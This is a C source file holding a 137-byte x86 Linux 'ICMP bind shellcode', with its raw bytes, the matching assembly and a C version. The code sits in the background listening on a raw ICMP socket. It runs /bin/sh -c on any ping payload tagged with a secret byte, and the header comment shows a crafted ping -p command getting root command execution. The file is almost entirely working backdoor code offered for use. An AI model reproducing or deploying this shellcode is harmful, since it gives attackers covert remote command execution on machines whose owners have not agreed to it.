/*
	x86 linux icmp bind shellcode (137 bytes) by gloomy@netric.org

[example]

 main:/home/gloomy/security/shellcode/linux/icmp# ./icmp
 Size of shellcode = 137

 main:/home/gloomy/security/shellcode/linux/icmp# ping -p 992f7573722f62696e2f69643e6f7574 -c 1 -s 26 localhost
 PATTERN: 0x992f7573722f62696e2f69643e6f7574 (\x99/usr/bin/id>out)
 34 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.5 ms
 main:/home/gloomy/security/shellcode/linux/icmp# cat out
 uid=0(root) gid=0(root) groups=0(root)
 main:/home/gloomy/security/shellcode/linux/icmp#

*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SECRET_CHAR	"\x99"

char shell[] =
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x66"
	"\x43\x41\x51\xb1\x03\x51\x49\x51"
	"\x89\xe1\xcd\x80\x89\xc2\xb0\x02"
	"\xcd\x80\x31\xdb\x39\xc3\x75\x55"
	"\x31\xc0\x31\xdb\xb0\x10\x50\xb0"
	"\xff\x54\x54\x53\x50\x55\x52\x89"
	"\xe1\xb0\x66\xb3\x0c\xcd\x80\x89"
	"\xe9\x01\xc1\x31\xc0\x88\x41\xfe"
	"\xb0\x25\x01\xc5\xb0" SECRET_CHAR
	"\x32\x45\xff\x75\xd5\xb0\x02\xcd"
	"\x80\x31\xdb\x39\xc3\x74\x25\xeb"
	"\xc9\x31\xc0\x31\xdb\xb3\x02\xb0"
	"\x06\xcd\x80\x5b\x89\xd9\x88\x43"
	"\x07\x80\xc1\x08\x50\x55\x51\x53"
	"\x89\xe1\x99\xb0\x0b\xcd\x80\x31"
	"\xc0\x40\xcd\x80\xe8\xd8\xff\xff"
	"\xff"
	"/bin/sh -c";

void asm_code() {
	__asm("
		xorl %eax,%eax
		xorl %ebx,%ebx
		xorl %ecx,%ecx
		movb $0x66,%al
		incl %ebx
		incl %ecx
		push %ecx
		movb $0x3,%cl
		push %ecx
		decl %ecx
		push %ecx
		movl %esp,%ecx
		int  $0x80		/* socket(); */
		movl %eax,%edx

		movb $0x2,%al
		int  $0x80		/* fork(); */
		xorl %ebx,%ebx
		cmpl %eax,%ebx
		jne  exit

	endlessloop:
		xorl %eax,%eax
		xorl %ebx,%ebx
		movb $0x10,%al
		push %eax
		movb $0xff,%al
		push %esp
		push %esp
		push %ebx
		push %eax
		push %ebp
		push %edx
		movl %esp,%ecx	
		movb $0x66,%al
		movb $0x0c,%bl
		int  $0x80		/* recvfrom(); */

		movl %ebp,%ecx
		addl %eax,%ecx
		xorl %eax,%eax
		movb %al,-2(%ecx)
		movb $0x25,%al
		addl %eax,%ebp
		movb $0x99,%al		/* SECRET_CHAR */
		xorb -1(%ebp),%al
		jnz  endlessloop
		
		movb $0x2,%al
		int  $0x80		/* fork(); */
		xorl %ebx,%ebx
		cmpl %eax,%ebx	
		je   stack 	
		jmp  endlessloop 
	execve:
		xorl %eax,%eax
		xorl %ebx,%ebx
		movb $0x2,%bl
		movb $0x6,%al
		int  $0x80		/* close(); */

		pop  %ebx
		movl %ebx,%ecx
		movb %al,0x7(%ebx)
		addb $0x8,%cl
		push %eax
		push %ebp
		push %ecx
		push %ebx
		movl %esp,%ecx
		cdq
		movb $0xb,%al
		int  $0x80		/* execve(); */
	exit:
		xorl %eax,%eax
		incl %eax
		int  $0x80		/* exit(); */
	stack:
		call execve
		.string \"/bin/sh -c\"
		
	");
}


void c_code() {
	int fd;
	int nb = 0;
	struct sockaddr_in them;
	int them_size = sizeof(struct sockaddr);
	char buf[256];
	char *prog[] = {"/bin/sh","-c",&buf[37],NULL};

	fd = socket(2,3,1);
	if (fork() > 0) exit(0);
	while (1) {
		while (!(nb = recvfrom(fd,buf,255,0,(struct sockaddr *)&them,&them_size)));
		buf[nb-1] = 0;
		if (buf[36] == (char)SECRET_CHAR)
			if (fork() == 0) { close(2); execve(prog[0],prog,NULL); }
	}
}

int main(int c,char *v[]) {
	void (*i)();
	i = (void (*)())shell;
	fprintf(stderr,"Size of shellcode = %d\n\n",strlen(shell));
	i();
	return 0;
}
